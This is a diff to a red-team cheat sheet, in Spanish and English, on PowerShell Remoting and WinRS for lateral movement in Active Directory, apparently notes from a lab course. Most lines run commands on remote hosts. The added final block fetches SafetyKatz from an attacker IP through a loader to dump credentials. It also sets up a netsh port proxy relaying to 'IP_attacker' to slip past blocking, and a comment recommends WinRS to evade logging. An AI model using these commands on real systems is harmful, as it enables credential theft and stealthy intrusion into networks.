@@ -1,6 +1,6 @@
 # Powershell Remoting & Tradecraft 
 
-Tags: #AD #Windows #Powershell 
+Tags: #AD #Windows #Powershell #Tradecraft #Winrs
 
 
 ```bash 
@@ -22,9 +22,16 @@ Piensa en Powershell Remoting (PSRemoting) como 'psexec' con esteroides pero muc
 	- Invoke-Command 
 ```
 
+```powershell 
+❯ Enter-PSSession hostname     # Iniciar una sesión remota interactiva con el hostname or IP address 
+```
+
 ## Powershell Remoting 
 
 ```powershell 
+❯ Invoke-Command -ScriptBlock {$env:computername;$env:username} -ComputerName hostname  # Runs a command or script block 'remotely' on one or more computers via 'PowerShell Remoting and specifies the 'target machine' (replace `hostname` with the actual name or IP).
+❯ Invoke-Command -ScriptBlock {$env:computername;$env:username} -ComputerName (cat C:\AD\servers.txt)  # The `Invoke-Command` reads the file (`servers.txt`) locally, then runs the script block remotely on each computer listed.
+
 ❯ Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <list_of_servers>)  # Ejecutar comandos o scriptblocks 
 ❯ Invoke-Command -FilePath C:\AD\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)  # Ejecutar scripts desde un archivo 
 
@@ -46,4 +53,23 @@ Piensa en Powershell Remoting (PSRemoting) como 'psexec' con esteroides pero muc
 ```powershell 
 # Usar WinRS en lugar de PSRemoting para evadir el 'logging' y beneficiarse del puerto 5985
 ❯ winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname 
+
+❯ winrs -r:hostname cmd 
+
+❯ winrs -r:hostname set computername 
+
+❯ winrs -r:dcorp-mgmt cmd /c "set computername && set username"   # Ejecutar comandos 
+```
+
+```powershell 
+# Extraer credenciales 
+
+❯ winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://IP/SafetyKatz.exe sekurlsa::evasive-keys exit" 
+
+# La mejor manera para evitar bloqueos 
+❯ $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP_attacker" 
+❯ $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit" 
+
+Notas:
+	1. Se pueden ejecutar los comandos anteriores sin '$null' en caso de que si te lo permita  
 ```
